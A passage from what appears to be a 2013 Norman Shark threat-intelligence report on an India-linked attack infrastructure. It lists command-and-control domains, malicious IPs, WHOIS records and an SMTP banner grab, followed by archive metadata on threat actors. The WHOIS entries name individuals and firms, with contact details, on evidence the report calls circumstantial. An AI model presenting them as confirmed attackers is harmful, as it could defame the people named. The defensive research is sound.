registration information is also used for other domains that seem unrelated to the attack\ninfrastructure, like hackerscouncil.com which May 12[th] 2011 had the following entry (source:\ngwebtools.com).\n\n\n-----\n\nApril 3[th] 2011, a little over a month before the registration entry above, hackerscouncil.com was\nregistered by Appin Technologies (5). This is possibly a coincidence.\n```\nHACKERSCOUNCIL.COM\nRegistrant:\n  Appin Technologies\n  Rakesh Gupta    (rakesh.gupta@appinonline.com)\n  9th Floor, Metro Heights,NSP, PitamPura,\n  Delhi\n  Delhi,110034\n  IN\n  Tel. +91.1147063300\nCreation Date: 17-Sep-2009 \nExpiration Date: 17-Sep-2011\n\n```\nThe domain piegauz.net, which was used as a Command and Control domain for several trojan\nconfigurations was created April 21[st] 2010 and had the following initial registration information:\n```\nPIEGAUZ.NET\nRegistrant:\n  PrivacyProtect.org\n  Domain Admin    (contact@privacyprotect.org)\n  P.O. Box 97\n  Note - All Postal Mails Rejected, visit Privacyprotect.org\n  Moergestel\n  null,5066 ZH\n  NL\n  Tel. +45.36946676\n\n```\nOne trojan using this domain (md5 4a44b6b6463fa1a8e0515669b10bd338) was submitted to the\nThreatExpert analysis service October 28[th] 2010, at which time the domain was operational and accepted\nuploads from the malware (6). Three days later, October 31[st] 2010, the domain got suspended, which\nremoved its privacy protection:\n```\nPIEGAUZ.NET \nRegistrant:\n  Appin Technologies\n  Rakesh Gupta    (rakesh.gupta@appinonline.com)\n  9th Floor, Metro Heights,NSP, PitamPura,\n  Delhi\n  Delhi,110034\n  IN\n  Tel. +91.1147063300\nCreation Date: 21-Apr-2010 \nExpiration Date: 21-Apr-2011\n\n```\nThe domain bluecreams.com was initially registered by Appin Security Solutions Pvt. Ltd. Sept 17[th] 2009.\nThe day after it was put under privacy protection. In the period from end of June 2010 to February 2011\nit was documented as download domain for several trojans (7). It was suspended Apr 18[th] 2011 and then\ndisplayed the already mentioned Prakash Jain as registrant.\n\n\n-----\n\nAnother example is the domain zerodayexploits.org. This domain has a history of resolving to a series of\nmalicious IP addresses used for malware attacks (173.236.24.254, 8.22.200.44). This web site which\noffers bounties for zeroday exploits, claims to be founded by “Appin Morpheus” and powered by Appin.\n\n_Source: bgwhois.com_\n\nAlso the live behaviour of some domains shows the word Appin. The malicious domains alr3ady.net,\n_wearwellgarments.eu, ezservicecenter.org, secuina.net, go-jobs.net, shoperstock.com and_\n_maxtourguide.info inhabit the IP space 178.32.75.192 - 178.32.75.197. All these IP’s return a_\nrecognizable ESMTP banner:\n\n```\n$ telnet 178.32.75.193 587\nTrying 178.32.75.193...\nConnected to 178.32.75.193.\nEscape character is '^]'.\n220 transformer13_appin ESMTP Exim 4.80.1 Sat, 23 Mar 2013 20:36:34 +0300\n\n```\n\n-----\n\nOther interesting indicators were found when we examined the domain softservices.org; a domain which\nhas held several of the known malicious IP addresses used by this group (46.182.104.83, 94.185.81.153,\n89.207.135.242). However, even if the domain was obviously connected, we could find no malware that\nused it. Instead, we found this forum post on the Nokia developer forum:\n\n_Developer username redacted._\n\nThe interesting bit was found further down this thread, where the developer posted a snippet of source\ncode:\n\n_This piece of code appears used for uploading mobile data like IMEI number to softservices.org._\n\nWe then found the apparent developer’s profile on Elance, an online employment service for freelance\nprogrammers.\n\n\n-----\n\n_The developer’s CV on Elance (name redacted)._\n\nBased on this we suspect that there are or have been projects to develop mobile malware by this group,\neven if we have not found any related mobile malware in our databases.\n\n\n-----\n\n### Mantra Tech Ventures and INNEFU\n\nMantra Tech Ventures is the registration service for several of the malicious domains that have been in\nuse. The service first came to our attention because it was used for registering the Command & Control\ndomains cobrapub.com, _mymyntra.net, and n00b4u.com. In addition, Mantra Tech Ventures owns_\n_abhedya.net, which seems to be a name server service for domains registered by them. Abhedya has_\nbeen used by several sites in the attack infrastructure like currentnewsstore.com, crvhostia.net,\n_webmicrosoftupdate.net and fuzzyfile.net._\n\nAbhedya is also visible in the PIEGAUZ.NET name server history:\n```\nEvent Date   Action     Pre-Action Server    Post-Action Server\n=============================================================================\n2010-04-22   New       -none-         Abhedya.net\n2010-04-23   Transfer    Abhedya.net       Piegauz.net\n2010-11-01   Delete     Piegauz.net       -none2010-11-04   New       -none-         Suspended-domain.com\n2010-11-11   Transfer    Suspended-domain.com  Piegauz.net\n2012-04-23   Transfer    Piegauz.net       Foundationapi.com\n2012-06-02   Delete     Foundationapi.com    -none2012-07-09   New       -none-         Above.com\n\n```\n_abedhya.net is currently a privacy protected domain, but it used to be registered by one Arun Bansal, CEO and_\nfounder of Mantra Ventures and the “Ethical Hacking Institute” hackingtruths.org.\n```\nDomain Name: ABHEDYA.NET \nRegistrant:\n  HackingTruths\n  Arun Bansal    (arun@hackingtruths.org)\n  *** ********* ***** *******\n  ******\n  Delhi,110085\n  IN\n\n```\nThe domain appinonline.com is also hosted on the cloud service mantragrid.com, a Mantra Ventures\ncompany.\n\nThere is another interesting detail: We found a connection log on one of the open drop folders earlier\nmentioned. This log folder was named “test” and data in it was uploaded from an IP belonging to the\nFrench provider OVH. The log contained data from a lab test PC whose registered owner was “innefu”.\n\n\n-----\n\nThere is indeed an Indian information security consulting group named Innefu. The domain innefu.com\nwas registered by the same Arun Bansal. Innefu also hires “ethical hackers”:\n\nIt is possible that Mantra Tech Ventures hosted the malicious sites by coincidence, and it is possible that\nINNEFU (if indeed the mentioned log came from them) just happened to run the malware in an\nautomatic test system like many other security vendors do as part of their malware analysis research.\n\n### Conclusion\n\nWhen researching the attack against Telenor we were able to uncover that actors apparently operating\nfrom India have been conducting attacks against business, government and political organizations\naround the world for over three years.\n\nThere are also indicators of involvement by private sector companies or persons connected to these,\nthough these data are circumstantial and may be attempts to implicate said companies.\n\nWe have no visibility into whether the attacks were done on behalf of others, and if so who\ncommissioned them or whether all attacks were commissioned by one entity or by several.\n\nThe methods used were primarily based on different social engineering tactics rather than exploits, but\nhistory has shown that social engineering based attacks can be very successful, confirmed once again by\nlooking at the data we have been able to uncover.\n\nOrganizations today need to realize that it’s not a matter of whether they will be compromised but a\nquestion of when and have a plan in place for how to deal with those compromises.\n\n\n-----\n\n### Bibliography\n\n1. Scumware.org. Scumware search. scumware.org. [Online]\nhttp://www.scumware.org/report/173.236.24.254.\n\n2. MacKenzie, Stuart. [Online] http://www.thetimes.co.uk/tto/multimedia/archive/00372/DOC100113100120132_372895a.pdf.\n\n3. Wikipedia. CME Group. Wikipedia. [Online] http://en.wikipedia.org/wiki/CME_Group.\n\n4. WIPO. WIPO Arbitration and Mediation Center. WIPO. [Online]\nhttp://www.oapi.wipo.net/amc/en/domains/search/text.jsp?case=D2012-1666.\n\n5. Domaintools. Domaintools History. Domaintools. [Online]\nhttp://www.domaintools.com/research/whoishistory/?page=details&domain=hackerscouncil.com&date=2011-04-03.\n\n6. ThreatExpert Analysis. ThreatExpert. [Online]\nhttp://www.threatexpert.com/report.aspx?md5=4a44b6b6463fa1a8e0515669b10bd338.\n\n7. Scumware.org. Scumware search. Scumware.org. [Online]\nhttp://www.scumware.org/report/bluecreams.com.\n\n8. Viruswatch. Virus-sites with status changes. Clean-MX.com. [Online] http://lists.cleanmx.com/pipermail/viruswatch/20110317/023586.html.\n\nPassive DNS data provided by ISC Security (https://security.isc.org/)\n\n\n-----\n\n### Appendixes (available in a separate document)\n\nA. Samples extracted from Telenor intrusion\n\nB. Some related cases based on behaviour and malware similarity parameters.\n\nC. Malware string indicators\n\nD. Project and debug paths extracted from executables\n\nE. Domain names connected to case\n\nF. IP addresses connected to case\n\nG. Sample MD5’s\n\n\nNorman Shark is a global leader and pioneer in proactive security software\nsolutions and forensics malware tools. Norman Shark offers enterprise\ncustomers a portfolio of solutions for analyzing and building defensible\nnetworks against advanced targeted attacks. Formerly part of Norman AS, a\nNorway-based IT security company established in 1984, Norman Shark\nbecame an independent company in January 2013, to allow the company to\nfocus on developing solutions for Threat Discovery, security analytics and\nICS protection to address the growing needs of the enterprise market.\n\n\n**Contact Us:**\n\n1855 1st Ave., Suite 201\nSan Diego, CA 92101\n1.888.466.6762\n\nStrandveien 37\nLysaker, Norway\n+47-67-10-97-00\n\nwww.normanshark.com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/f5wyu7306nti3lbp58uesioijsl9zamm",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2013/2013.05.20.Operation_Hangover/NS-Unveiling-an-Indian-Cyberattack-Infrastructure_FINAL_Web.pdf"
    ],
    "report_names": [
        "NS-Unveiling-an-Indian-Cyberattack-Infrastructure_FINAL_Web"
    ],
    "threat_actors": [
        {
            "id": "88854a9f-641a-4412-89db-449b4d5cbc51",
            "created_at": "2022-10-25T16:07:23.963599Z",
            "updated_at": "2025-03-27T02:02:10.051548Z",
            "deleted_at": null,
            "main_name": "Operation HangOver",
            "aliases": [
                "Monsoon",
                "Operation HangOver",
                "Viceroy Tiger"
            ],
            "source_name": "ETDA:Operation HangOver",
            "tools": [
                "AutoIt backdoor",
                "BADNEWS",
                "BackConfig",
                "JakyllHyde",
                "TINYTYPHON",
                "Unknown Logger",
                "WSCSPL"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cfdd35af-bd12-4c03-8737-08fca638346d",
            "created_at": "2022-10-25T16:07:24.165595Z",
            "updated_at": "2025-03-27T02:02:10.128957Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "Cosmic Wolf",
                "Marbled Dust",
                "Silicon",
                "Teal Kurma",
                "UNC1326"
            ],
            "source_name": "ETDA:Sea Turtle",
            "tools": [
                "Drupalgeddon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cfdd350b-de30-4d29-bbee-28159f26c8c2",
            "created_at": "2023-01-06T13:46:38.433736Z",
            "updated_at": "2025-03-27T02:00:02.832565Z",
            "deleted_at": null,
            "main_name": "VICEROY TIGER",
            "aliases": [
                "OPERATION HANGOVER",
                "Donot Team",
                "APT-C-35",
                "SectorE02",
                "Orange Kala"
            ],
            "source_name": "MISPGALAXY:VICEROY TIGER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7b039cc0-33b6-495a-b4ca-649d096b993d",
            "created_at": "2023-01-06T13:46:38.482654Z",
            "updated_at": "2025-03-27T02:00:02.845093Z",
            "deleted_at": null,
            "main_name": "APT22",
            "aliases": [
                "BRONZE OLIVE",
                "Group 46",
                "G0039",
                "Suckfly"
            ],
            "source_name": "MISPGALAXY:APT22",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9c884c88-2c9f-49c5-856a-2383ad1d8ef8",
            "created_at": "2024-05-01T02:03:08.152Z",
            "updated_at": "2025-03-27T02:05:17.422887Z",
            "deleted_at": null,
            "main_name": "ZINC EMERSON",
            "aliases": [
                "Dropping Elephant ",
                "EHDevel ",
                "Manul ",
                "Monsoon ",
                "Operation Hangover ",
                "Patchwork ",
                "TG-4410 ",
                "Viceroy Tiger ",
                "Confucius "
            ],
            "source_name": "Secureworks:ZINC EMERSON",
            "tools": [
                " Hanove",
                " Mac OS X KitM Spyware",
                " Proyecto2",
                " YTY Backdoor",
                "Enlighten Infostealer"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "1d0f389f-2f6c-415d-91f4-633bd6c645f7",
            "created_at": "2024-05-01T02:03:07.974188Z",
            "updated_at": "2025-03-27T02:05:17.280317Z",
            "deleted_at": null,
            "main_name": "BRONZE OLIVE",
            "aliases": [
                "Barista",
                "Group 46 ",
                "Suckfly ",
                "APT22 "
            ],
            "source_name": "Secureworks:BRONZE OLIVE",
            "tools": [
                " DestroyRAT",
                " PlugX",
                " TCP/ICMP RAT",
                "Angryrebel"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "33ae2a40-02cd-4dba-8461-d0a50e75578b",
            "created_at": "2023-01-06T13:46:38.947314Z",
            "updated_at": "2025-03-27T02:00:02.959421Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "SILICON",
                "Teal Kurma",
                "UNC1326",
                "COSMIC WOLF",
                "Marbled Dust"
            ],
            "source_name": "MISPGALAXY:Sea Turtle",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c81067e0-9dcb-4e3f-abb0-80126519c5b6",
            "created_at": "2022-10-25T15:50:23.285448Z",
            "updated_at": "2025-03-27T02:00:55.42906Z",
            "deleted_at": null,
            "main_name": "Patchwork",
            "aliases": [
                "Hangover Group",
                "Dropping Elephant",
                "Chinastrats",
                "Operation Hangover"
            ],
            "source_name": "MITRE:Patchwork",
            "tools": [
                "NDiskMonitor",
                "QuasarRAT",
                "BackConfig",
                "TINYTYPHON",
                "AutoIt backdoor",
                "PowerSploit",
                "BADNEWS",
                "Unknown Logger",
                "Socksbot"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041706,
    "ts_creation_date": 1375968172,
    "ts_modification_date": 1376584525,
    "files": {
        "pdf": "https://archive.orkl.eu/aae01ca44ca11f33692bcfd9a20e36105ddfa2b9.pdf",
        "text": "https://archive.orkl.eu/aae01ca44ca11f33692bcfd9a20e36105ddfa2b9.txt",
        "img": "https://archive.orkl.eu/aae01ca44ca11f33692bcfd9a20e36105ddfa2b9.jpg"
    }
}